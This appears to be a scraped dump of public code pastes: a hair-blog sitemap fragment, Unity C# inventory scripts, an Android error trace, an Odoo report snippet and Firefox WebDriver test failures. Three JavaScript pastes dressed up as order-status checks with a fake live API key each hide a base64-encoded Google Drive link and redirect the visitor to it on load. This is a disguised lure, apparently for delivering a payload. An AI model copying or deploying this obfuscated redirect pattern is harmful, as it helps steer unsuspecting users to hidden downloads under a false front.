<loc>https://glowhairtrend.blogspot.com/2025/04/hottest-hair-colors-for-2025-from-soft.html</loc>
</url>
<url>
<loc>https://glowhairtrend.blogspot.com/2025/04/5-ways-to-care-for-dry-hair-to-keep-it.html</loc>
</url>
<url>
<loc>https://glowhairtrend.blogspot.com/2025/04/2025-hair-color-trends-youll-see.html</loc>
</url>
<url>
<loc>https://glowhairtrend.blogspot.com/2025/04/haircare-routine-that-works-from-flat.html</loc>
</url>
<url>
<loc>https://glowhairtrend.blogspot.com/2025/04/the-best-hairstyles-for-busy-moms-that.html</loc>
</url>
<url>
<loc>https://glowhairtrend.blogspot.com/2025/04/how-to-achieve-effortless-beach-waves.html</loc>
</url>
<url>
<loc>https://glowhairtrend.blogspot.com/2025/04/tips-for-choosing-hairstyle-according.html</loc>
</url>
<url>
<loc>https://glowhairtrend.blogspot.com/2025/04/hair-botox-new-secret-to-healthy-hair.html</loc>
</url>
<url>
<loc>https://glowhairtrend.blogspot.com/2025/04/10-quick-and-stylish-hairstyles-for.html</loc>
</url>
</urlset>"
SaVf9Wuy,Market.js,dentira,JavaScript,Tuesday 8th of April 2025 08:46:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56176/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LyavNUSc,Untitled,dentira,JavaScript,Tuesday 8th of April 2025 08:31:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39732/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Qmh0qscK,UIManager - Part 6.2.1.1,evelynshilosky,C#,Tuesday 8th of April 2025 08:26:31 AM CDT,"using UnityEngine;
using UnityEngine.UI;
using UnityEngine.EventSystems;
using System.Collections.Generic;
using TMPro;

public class UIManager : MonoBehaviour
{
    public static UIManager Instance { get; private set; }

    public GameObject inventoryPanel;
    public GameObject inventoryPrompt;
    public Text promptText;
    public Button yesButton;
    public Button noButton;
    public Button okButton;
    public Button closeButton;
    public Button inventoryDoneButton;
    public Transform inventorySlotParent;
    public Transform storageHolder;
    public GameObject moneyDisplay;
    public GameObject doneButton;
    public GameObject itemDetailsPanel;
    public TextMeshProUGUI itemTitleText;
    public TextMeshProUGUI itemDescriptionText;
    public TextMeshProUGUI itemUsesText;
    public TextMeshProUGUI inventoryTitleText;

    [SerializeField] private GameObject itemIconPrefab;

    private InventorySystem inventorySystem;
    private StorageSystem storageSystem;
    private InteractionSystem interactionSystem;
    private PlayerMovement playerMovement;
    private MouseMovement mouseMovement;
    private Item currentStorageItem;
    private Item draggedItem;
    private Transform originalSlot;

    public bool isInventoryOpen = false;

    private void Awake()
    {
        if (Instance == null)
        {
            Instance = this;
        }
        else
        {
            Destroy(gameObject);
        }
    }

    private void Start()
    {
        inventorySystem = InventorySystem.Instance;
        storageSystem = StorageSystem.Instance;
        interactionSystem = FindObjectOfType<InteractionSystem>();
        playerMovement = FindObjectOfType<PlayerMovement>();
        mouseMovement = FindObjectOfType<MouseMovement>();

        if (closeButton != null) closeButton.onClick.AddListener(CloseInventory);
        if (okButton != null)
        {
            okButton.onClick.AddListener(ClosePrompt);
            okButton.gameObject.SetActive(false);
        }
        if (yesButton != null) { yesButton.onClick.AddListener(() => HandleStoragePrompt(true)); }
        if (noButton != null) noButton.onClick.AddListener(() => HandleStoragePrompt(false));
        if (inventoryDoneButton != null) inventoryDoneButton.onClick.AddListener(CloseInventory);
    }

    public void ShowInventoryPrompt(Item storageItem)
    {
        currentStorageItem = storageItem;
        inventoryPrompt.SetActive(true);
        promptText.text = storageItem != null ? $""Open {storageItem.itemName}?"" : """";
        yesButton.gameObject.SetActive(true);
        noButton.gameObject.SetActive(true);
        okButton.gameObject.SetActive(false);
        TogglePlayerControls(false);
    }

    public void HandleStoragePrompt(bool accepted)
    {
        if (accepted && currentStorageItem != null)
        {
            OpenInventory(currentStorageItem); // Open inventory for the selected storage item
        }
        else
        {
            ClosePrompt(); // Close the prompt if ""No"" is selected
        }
    }


    public void UpdatePromptText(string message)
    {
        if (promptText != null)
        {
            promptText.text = message;
        }
    }

    public void ShowOkayButton()
    {
        if (okButton != null)
        {
            okButton.gameObject.SetActive(true);
            yesButton.gameObject.SetActive(false);
            noButton.gameObject.SetActive(false);
        }
    }

    public void OpenInventory(Item storageItem)
    {
        
        inventoryPrompt.SetActive(false);
        inventoryPanel.SetActive(true);

        currentStorageItem = storageItem;
        isInventoryOpen = true;

        TransferHeldItemsToStorage();
        PopulateInventoryUI(storageItem);
        TogglePlayerControls(false);

        if (inventoryTitleText != null)
        {
            inventoryTitleText.text = storageItem.itemName;
        }
    }

    private void TransferHeldItemsToStorage()
    {
        if (inventorySystem.leftHandItem != null)
        {
            bool added = storageSystem.AddToStorage(currentStorageItem, inventorySystem.leftHandItem);
            if (added)
            {
                inventorySystem.UnequipItem(true);
                playerMovement.UpdateCarryingAnimations();
            }
        }
        if (inventorySystem.rightHandItem != null)
        {
            bool added = storageSystem.AddToStorage(currentStorageItem, inventorySystem.rightHandItem);
            if (added)
            {
                inventorySystem.UnequipItem(false);
                playerMovement.UpdateCarryingAnimations();
            }
        }
    }

    public void PopulateInventoryUI(Item storageItem)
    {
        UIHelperFunctions.Instance.PopulateInventoryUI(storageItem, inventorySlotParent, storageSystem, this);
    }

    public void UpdateInventorySlot(GameObject slotObject, Item item)
    {
        UIHelperFunctions.Instance.UpdateInventorySlot(slotObject, item, itemIconPrefab, this);
    }

    public void ShowItemDetails(Item item)
    {
        UIHelperFunctions.Instance.ShowItemDetails(item, itemDetailsPanel, itemTitleText, itemDescriptionText, itemUsesText);
    }

    public void HideItemDetails()
    {
        UIHelperFunctions.Instance.HideItemDetails(itemDetailsPanel);
    }

    public void TryEquipItem(Item item)
    {
        UIHelperFunctions.Instance.TryEquipItem(item, inventorySystem, storageSystem, currentStorageItem, interactionSystem, playerMovement, this);
    }

    public void BeginDrag(Transform iconTransform)
    {
        UIHelperFunctions.Instance.BeginDrag(iconTransform, ref draggedItem, ref originalSlot, inventoryPanel);
    }

    public void EndDrag(Transform iconTransform)
    {
        UIHelperFunctions.Instance.EndDrag(iconTransform, draggedItem, originalSlot, inventorySlotParent, currentStorageItem, storageSystem, this);
        draggedItem = null;
    }

    public void ShowError(string message)
    {
        promptText.text = message;
        yesButton.gameObject.SetActive(false);
        noButton.gameObject.SetActive(false);
        okButton.gameObject.SetActive(true);
    }

    public void CloseInventory()
    {
        inventoryPanel.SetActive(false);
        isInventoryOpen = false;
        TogglePlayerControls(true);
    }

    private void TogglePlayerControls(bool enable)
    {
        if (playerMovement != null) playerMovement.enabled = enable;
        if (mouseMovement != null) mouseMovement.enabled = enable;
        SetCursorState(!enable);
    }

    public void ShowBackpackPrompt(Item backpackItem)
    {
        currentStorageItem = backpackItem;
        inventoryPrompt.SetActive(true);
        promptText.text = ""Would you like to wear the backpack?"";
        yesButton.gameObject.SetActive(true);
        noButton.gameObject.SetActive(true);
        okButton.gameObject.SetActive(false);
        SetCursorState(true);
        FreezePlayerMovement(true);
    }

    public void HandleBackpackPrompt(bool accepted)
    {
        if (accepted)
        {
            interactionSystem.WearBackpack();
        }
        else
        {
            UpdateBackpackPrompt();
        }
    }

    public void UpdateBackpackPrompt()
    {
        promptText.text = ""Okay, if you change your mind press E to equip the backpack"";
        yesButton.gameObject.SetActive(false);
        noButton.gameObject.SetActive(false);
        okButton.gameObject.SetActive(true);
        SetCursorState(true);
        FreezePlayerMovement(true);
    }

    public void ClosePrompt()
    {
        inventoryPrompt.SetActive(false);
        SetCursorState(false);
        FreezePlayerMovement(false);
        currentStorageItem = null;
    }

    private void SetCursorState(bool visible)
    {
        Cursor.visible = visible;
        Cursor.lockState = visible ? CursorLockMode.None : CursorLockMode.Locked;
    }

    private void FreezePlayerMovement(bool freeze)
    {
        if (playerMovement != null) playerMovement.enabled = !freeze;
        if (mouseMovement != null) mouseMovement.enabled = !freeze;
    }
}

public class ItemReference : MonoBehaviour
{
    public Item item;
}
"
y4eX6emr,InteractionSystem - Part 6.2.1.1,evelynshilosky,C#,Tuesday 8th of April 2025 08:24:10 AM CDT,"using UnityEngine;
using System.Collections.Generic;

public class InteractionSystem : MonoBehaviour
{
    public Transform leftObjectHolder;
    public Transform rightObjectHolder;
    public LayerMask pickupLayer;
    public float placementDistance = 5f;
    public LayerMask placementLayerMask;
    public float previewUpdateInterval = 0.1f;
    public float placementHeightOffset = 0.1f;
    public float rotationIncrement = 45f;
    public Transform backpackWearPosition;

    private InventorySystem inventorySystem;
    private PlayerMovement playerMovement;
    private UIManager uiManager;
    private bool isPrecisionDrop = false;
    private Dictionary<GameObject, int> originalLayers = new Dictionary<GameObject, int>();
    private float lastPreviewUpdateTime;
    private bool isRotating = false;
    private Vector3 currentRotation;
    private List<GameObject> previewObjects = new List<GameObject>();
    public Item currentBackpackItem;

    private void Start()
    {
        inventorySystem = InventorySystem.Instance;
        playerMovement = GetComponent<PlayerMovement>();
        uiManager = UIManager.Instance;
        UpdateItemVisibility();
    }

    private void Update()
    {
        if (isPrecisionDrop)
        {
            UpdatePlacementPreview();
            HandleRotation();
        }
        else
        {
            ClearPreviewObjects();
        }

        if (Input.GetKeyDown(KeyCode.E) && currentBackpackItem != null && !inventorySystem.IsBackpackEquipped)
        {
            WearBackpack();
        }
    }

    public void TryPickUpItem(InteractableObject interactable)
    {
        Item item = interactable.item;

        if (item.isBackpack && !inventorySystem.IsBackpackEquipped)
        {
            PickUpBackpack(item);
        }
        else
        {
            bool isLeftHand = inventorySystem.rightHandItem != null && inventorySystem.leftHandItem == null;
            EquipItem(item, isLeftHand, item.isTwoHanded);
            playerMovement.UpdateCarryingAnimations();
        }
    }

    public void InteractWithStorage(Item storageItem, bool isRightClick)
    {
        if (isRightClick)
        {
            UIManager.Instance.ShowInventoryPrompt(storageItem); // Show prompt for opening storage
        }
    }

    private void PickUpBackpack(Item backpackItem)
    {
        bool isLeftHand = inventorySystem.rightHandItem != null && inventorySystem.leftHandItem == null;
        EquipItem(backpackItem, isLeftHand, false);
        currentBackpackItem = backpackItem;
        uiManager.ShowBackpackPrompt(backpackItem);
    }

    public void HandleBackpackPrompt(bool accepted)
    {
        if (accepted)
        {
            WearBackpack();
        }
        else
        {
            uiManager.UpdateBackpackPrompt();
            // Don't close the prompt here
        }
    }

    public void WearBackpack()
    {
        if (currentBackpackItem != null)
        {
            bool wasLeftHand = inventorySystem.leftHandItem == currentBackpackItem;
            inventorySystem.UnequipItem(wasLeftHand);

            currentBackpackItem.transform.SetParent(backpackWearPosition);
            currentBackpackItem.transform.localPosition = Vector3.zero;
            currentBackpackItem.transform.localRotation = Quaternion.identity;

            Destroy(currentBackpackItem.GetComponent<Rigidbody>());
            MeshCollider meshCollider = currentBackpackItem.GetComponent<MeshCollider>();
            if (meshCollider != null) meshCollider.enabled = false;

            inventorySystem.EquipBackpack(currentBackpackItem);
            currentBackpackItem = null;

            UIManager.Instance.ClosePrompt();
            playerMovement.UpdateCarryingAnimations();
        }
    }

    public void UnequipBackpack()
    {
        if (inventorySystem.IsBackpackEquipped)
        {
            Item backpack = inventorySystem.backpack;
            inventorySystem.UnequipBackpack();

            MeshCollider meshCollider = backpack.GetComponent<MeshCollider>();
            if (meshCollider != null) meshCollider.enabled = true;

            if (backpack.GetComponent<Rigidbody>() == null)
            {
                backpack.gameObject.AddComponent<Rigidbody>();
            }

            backpack.transform.SetParent(null);
            backpack.transform.position = transform.position + transform.forward * 1.5f;

            playerMovement.UpdateCarryingAnimations();
        }
    }

    private void EquipItem(Item item, bool isLeftHand, bool isTwoHanded)
    {
        inventorySystem.EquipItem(item, isLeftHand, isTwoHanded);
        UpdateItemPosition(item.gameObject, isLeftHand);
        ChangeItemLayer(item.gameObject, pickupLayer);
        playerMovement.UpdateCarryingAnimations();
    }

    public void UpdateItemPosition(GameObject itemObject, bool isLeftHand)
    {
        Transform objectHolder = isLeftHand ? leftObjectHolder : rightObjectHolder;
        Item item = itemObject.GetComponent<Item>();
        Vector3 positionOffset = isLeftHand ? item.leftPositionOffset : item.rightPositionOffset;
        Vector3 rotationOffset = isLeftHand ? item.leftRotationOffset : item.rightRotationOffset;

        itemObject.transform.SetParent(objectHolder);
        itemObject.transform.localPosition = positionOffset;
        itemObject.transform.localRotation = Quaternion.Euler(rotationOffset);
    }

    private void UpdateItemVisibility()
    {
        if (inventorySystem.leftHandItem != null)
        {
            inventorySystem.leftHandItem.gameObject.SetActive(!isPrecisionDrop);
        }
        if (inventorySystem.rightHandItem != null)
        {
            inventorySystem.rightHandItem.gameObject.SetActive(!isPrecisionDrop);
        }
    }

    private void UpdatePlacementPreview()
    {
        if (Time.time - lastPreviewUpdateTime < previewUpdateInterval) return;

        lastPreviewUpdateTime = Time.time;

        RaycastHit hit;
        if (Physics.Raycast(Camera.main.transform.position, Camera.main.transform.forward, out hit, placementDistance, placementLayerMask))
        {
            List<Item> itemsToPlace = new List<Item>();
            if (inventorySystem.leftHandItem != null) itemsToPlace.Add(inventorySystem.leftHandItem);
            if (inventorySystem.rightHandItem != null) itemsToPlace.Add(inventorySystem.rightHandItem);

            ClearPreviewObjects();

            Vector3 previewPosition = hit.point + hit.normal * (0.05f + placementHeightOffset);
            Quaternion previewRotation = !isRotating ? Quaternion.LookRotation(hit.normal, Vector3.up) : Quaternion.Euler(currentRotation);

            for (int i = 0; i < itemsToPlace.Count; i++)
            {
                GameObject previewObj = Instantiate(itemsToPlace[i].gameObject);
                Destroy(previewObj.GetComponent<Rigidbody>());
                Destroy(previewObj.GetComponent<Collider>());
                previewObj.AddComponent<Outline>();

                previewObj.transform.position = previewPosition + Vector3.right * (i * 0.5f);
                previewObj.transform.rotation = previewRotation;

                Outline outline = previewObj.GetComponent<Outline>();
                outline.OutlineMode = Outline.Mode.OutlineAll;
                outline.OutlineColor = Color.green;
                outline.OutlineWidth = 5f;

                previewObjects.Add(previewObj);
                previewObj.SetActive(true);
            }

            bool canPlace = !Physics.Raycast(previewPosition, Vector3.down, placementHeightOffset + 0.05f, placementLayerMask);
            foreach (var obj in previewObjects)
            {
                obj.GetComponent<Outline>().OutlineColor = canPlace ? Color.green : Color.red;
            }
        }
        else
        {
            ClearPreviewObjects();
        }
    }

    private void HandleRotation()
    {
        if (Input.GetKeyDown(KeyCode.R))
        {
            isRotating = !isRotating;
            if (isRotating)
            {
                currentRotation = previewObjects[0].transform.rotation.eulerAngles;
                uiManager.ShowInventoryPrompt(null);
                uiManager.UpdatePromptText(""Rotation mode enabled. Use Q/E to rotate horizontally, Z/C to rotate vertically."");
                uiManager.ShowOkayButton();
            }
            else
            {
                uiManager.ShowInventoryPrompt(null);
                uiManager.UpdatePromptText(""Rotation mode disabled."");
                uiManager.ShowOkayButton();
            }
        }

        if (isRotating && previewObjects.Count > 0)
        {
            if (Input.GetKeyDown(KeyCode.Q))
            {
                currentRotation.y -= rotationIncrement;
            }
            else if (Input.GetKeyDown(KeyCode.E))
            {
                currentRotation.y += rotationIncrement;
            }
            else if (Input.GetKeyDown(KeyCode.Z))
            {
                currentRotation.x -= rotationIncrement;
            }
            else if (Input.GetKeyDown(KeyCode.C))
            {
                currentRotation.x += rotationIncrement;
            }

            foreach (var obj in previewObjects)
            {
                obj.transform.rotation = Quaternion.Euler(currentRotation);
            }
        }
    }

    public void DropItem(bool isLeftHand)
    {
        Item itemToDrop = isLeftHand ? inventorySystem.leftHandItem : inventorySystem.rightHandItem;
        if (itemToDrop != null)
        {
            GameObject itemObject = itemToDrop.gameObject;
            itemObject.transform.SetParent(null);

            Vector3 dropPosition;
            if (isPrecisionDrop && previewObjects.Count > 0)
            {
                int index = isLeftHand ? 0 : (previewObjects.Count > 1 ? 1 : 0);
                dropPosition = previewObjects[index].transform.position;
                itemObject.transform.position = dropPosition;
                itemObject.transform.rotation = previewObjects[index].transform.rotation;
            }
            else
            {
                dropPosition = transform.position + transform.forward * 1f + transform.right * Random.Range(-0.5f, 0.5f);
                itemObject.transform.position = dropPosition;
                itemObject.transform.rotation = Random.rotation;
            }

            itemObject.SetActive(true);

            Rigidbody rb = itemObject.GetComponent<Rigidbody>();
            if (rb == null) rb = itemObject.AddComponent<Rigidbody>();
            rb.isKinematic = false;
            rb.useGravity = true;
            rb.AddForce(Vector3.down * 2f, ForceMode.Impulse);

            inventorySystem.UnequipItem(isLeftHand);
            RestoreOriginalLayer(itemObject);

            InteractableObject interactable = itemObject.GetComponent<InteractableObject>();
            if (interactable != null)
            {
                interactable.enabled = true;
            }

            playerMovement.UpdateCarryingAnimations();
        }

        ClearPreviewObjects();

        if (inventorySystem.leftHandItem == null && inventorySystem.rightHandItem == null)
        {
            isPrecisionDrop = false;
            isRotating = false;
        }

        UpdateItemVisibility();
    }

    public void DropBothItems()
    {
        DropItem(true);
        DropItem(false);
    }

    public void ChangeItemLayer(GameObject itemObject, LayerMask newLayer)
    {
        if (!originalLayers.ContainsKey(itemObject))
        {
            originalLayers[itemObject] = itemObject.layer;
        }
        itemObject.layer = (int)Mathf.Log(newLayer.value, 2);
    }

    private void RestoreOriginalLayer(GameObject itemObject)
    {
        if (originalLayers.ContainsKey(itemObject))
        {
            itemObject.layer = originalLayers[itemObject];
            originalLayers.Remove(itemObject);
        }
    }

    public void TogglePrecisionDrop()
    {
        isPrecisionDrop = !isPrecisionDrop;
        UpdateItemVisibility();
        uiManager.ShowInventoryPrompt(null);
        uiManager.UpdatePromptText(isPrecisionDrop ? ""Precision drop enabled"" : ""Precision drop disabled"");
        uiManager.ShowOkayButton();
    }

    private void ClearPreviewObjects()
    {
        foreach (var obj in previewObjects)
        {
            Destroy(obj);
        }
        previewObjects.Clear();
    }

    public bool IsPrecisionDropEnabled()
    {
        return isPrecisionDrop;
    }
}
"
21vgrr7b,StorageInteractable - Part 6.2.1.1,evelynshilosky,C#,Tuesday 8th of April 2025 08:23:08 AM CDT,"using UnityEngine;

public class StorageInteractable : InteractableObject
{
    public Transform storageHolder;

    private void Awake()
    {
        item = GetComponent<Item>();
        if (item == null)
        {
            Debug.LogError(""StorageInteractable requires an Item component on the same GameObject."");
            enabled = false;
        }
    }

    private void Start()
    {
        if (item != null && storageHolder != null)
        {
            StorageSystem.Instance.InitializeStorage(item);
            StorageSystem.Instance.RegisterStorage(item, storageHolder);
        }
    }

    public override void Interact(PlayerMovement playerMovement, bool isRightClick)
    {
        if (isRightClick)
        {
            UIManager.Instance.ShowInventoryPrompt(item);
        }
        else
        {
            base.Interact(playerMovement, isRightClick);
        }
    }
}
"
5LLEf2p5,2025-04-08T10:19:24.639439,powerampache,PHP,Tuesday 8th of April 2025 08:19:26 AM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""umbrel.tail94509.ts.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""umbrel.tail94509.ts.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""umbrel.tail94509.ts.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
hXSMknbZ,[QW][4678564]adapt_title_if_wedding,rht_odoo,XML,Tuesday 8th of April 2025 08:16:21 AM CDT,"<data>
    <!--
    Done by RHT on the 04/04/2025
    Need : Different title of the report when it is for a wedding (x_studio_wedding = True)
    Task : https://www.odoo.com/odoo/project.task/4678564
    Pastebin : https://pastebin.com/hXSMknbZ
    -->
    <xpath expr=""//div[@class='clearfix invoice_main']/div/t/t/span[3]"" position=""replace"">
            <span t-if=""o.move_type == 'out_invoice' and o.state == 'posted' and o.x_studio_wedding"">Redevance Note</span>
            <span t-if=""o.move_type == 'out_invoice' and o.state == 'posted' and not o.x_studio_wedding"">Invoice</span>
    
    </xpath>
</data>"
C2wLYQLR,Products.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 08:15:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14000/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tbGRHxCB,Untitled,Temidayo12,Bash,Tuesday 8th of April 2025 08:13:24 AM CDT,"======================
 1:24.03 TEST_END: Test OK. Subtests passed 15/15. Unexpected 0
 1:24.03 INFO No more tests
 1:24.03 INFO Closing logging queue
 1:24.03 INFO queue closed
 1:24.15 SUITE_END

web-platform-test
~~~~~~~~~~~~~~~~~
Ran 74 checks (70 subtests, 4 tests)
Expected results: 66
Unexpected results: 8
  test: 1 (1 error)
  subtest: 7 (7 fail)

Unexpected Results
------------------
/webdriver/tests/bidi/browser/set_client_window_state/invalid.py
  FAIL test_client_window_x_invalid_type[100.5] - Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4', value = 100.5

    @pytest.mark.parametrize(""value"", [True, ""invalid"", 100.5, [], {}])
    async def test_client_window_x_invalid_type(bidi_session, first_window_id, value):
>       with pytest.raises(error.InvalidArgumentException):
E       Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4'
value      = 100.5

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/invalid.py:59: Failed
  FAIL test_client_window_y_invalid_type[100.5] - Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4', value = 100.5

    @pytest.mark.parametrize(""value"", [True, ""invalid"", 100.5, [], {}])
    async def test_client_window_y_invalid_type(bidi_session, first_window_id, value):
>       with pytest.raises(error.InvalidArgumentException):
E       Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4'
value      = 100.5

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/invalid.py:68: Failed
  FAIL test_client_window_width_invalid_type[100.5] - Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4', value = 100.5

    @pytest.mark.parametrize(""value"", [True, ""invalid"", 100.5, [], {}])
    async def test_client_window_width_invalid_type(bidi_session, first_window_id, value):
>       with pytest.raises(error.InvalidArgumentException):
E       Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4'
value      = 100.5

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/invalid.py:77: Failed
  FAIL test_client_window_width_invalid_bounds[2147483647] - Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4', bound = 2147483647

    @pytest.mark.parametrize(""bound"", [-1, MAX_INT])
    async def test_client_window_width_invalid_bounds(bidi_session, first_window_id, bound):
>       with pytest.raises(error.InvalidArgumentException):
E       Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
bound      = 2147483647
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4'

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/invalid.py:86: Failed
  FAIL test_client_window_height_invalid_type[100.5] - Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4', value = 100.5

    @pytest.mark.parametrize(""value"", [True, ""invalid"", 100.5, [], {}])
    async def test_client_window_height_invalid_type(bidi_session, first_window_id, value):
>       with pytest.raises(error.InvalidArgumentException):
E       Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4'
value      = 100.5

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/invalid.py:95: Failed
  FAIL test_client_window_height_invalid_bounds[2147483647] - Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4', bound = 2147483647

    @pytest.mark.parametrize(""bound"", [-1, MAX_INT])
    async def test_client_window_height_invalid_bounds(bidi_session, first_window_id, bound):
>       with pytest.raises(error.InvalidArgumentException):
E       Failed: DID NOT RAISE <class 'webdriver.bidi.error.InvalidArgumentException'>

bidi_session = <webdriver.bidi.client.BidiSession object at 0x7fe432cf1dd0>
bound      = 2147483647
first_window_id = 'acc980a0-a589-4666-8bcd-4f807201b5e4'

testing/web-platform/tests/webdriver/tests/bidi/browser/set_client_window_state/invalid.py:104: Failed
/webdriver/tests/bidi/browser/set_client_window_state/rect_state.py
  ERROR /webdriver/tests/bidi/browser/set_client_window_state/rect_state.py
/webdriver/tests/bidi/browser/set_client_window_state/state.py
  FAIL test_set_client_window_state_transitions[m-to-i-f-to-u] - AssertionError: assert 'minimized' == 'fullscreen'
bidi_session = <webdriver.bidi.client.BidiSession object at 0x7f30395e4910>, initial_state = 'minimized'
target_state = 'fullscreen', first_window_id = '67ede9e6-088a-406c-b250-f776ab19a496'

    @pytest.mark.parametrize(
        ""initial_state,target_state"",
        [
            (""fullscreen"", ""normal""),
            (""fullscreen"", ""maximized""),
            (""fullscreen"", ""minimized""),

            (""maximized"", ""fullscreen""),
            (""maximized"", ""normal""),
            (""maximized"", ""minimized""),

            (""minimized"", ""fullscreen""),
            (""minimized"", ""maximized""),
            (""minimized"", ""normal""),

